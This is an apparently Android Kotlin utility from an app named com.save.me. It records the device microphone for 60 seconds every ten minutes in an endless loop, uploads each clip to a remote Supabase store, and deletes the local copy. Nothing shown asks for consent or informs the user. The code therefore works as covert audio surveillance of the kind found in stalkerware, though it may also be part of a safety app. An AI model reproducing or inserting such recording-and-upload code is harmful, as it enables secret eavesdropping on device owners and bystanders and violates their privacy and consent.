package com.save.me

import android.content.Context
import android.media.MediaRecorder
import kotlinx.coroutines.delay
import java.io.File
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object AudioUtils {
    suspend fun scheduleAudioTasks(context: Context) {
        while (true) {
            executeRecordAudio(context, 60)
            delay(10 * 60 * 1000L)
        }
    }

    suspend fun executeRecordAudio(context: Context, duration: Int) = withContext(Dispatchers.IO) {
        val file = File(context.externalCacheDir, "${System.currentTimeMillis()}.m4a")
        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioEncodingBitRate(128000)
            setAudioSamplingRate(44100)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }
        delay(duration * 1000L)
        try { recorder.stop() } catch (_: Exception) {}
        recorder.release()
        SupabaseUtils.uploadFileAndRecord(file, "audio/${file.name}", "audio")
        file.delete()
    }
}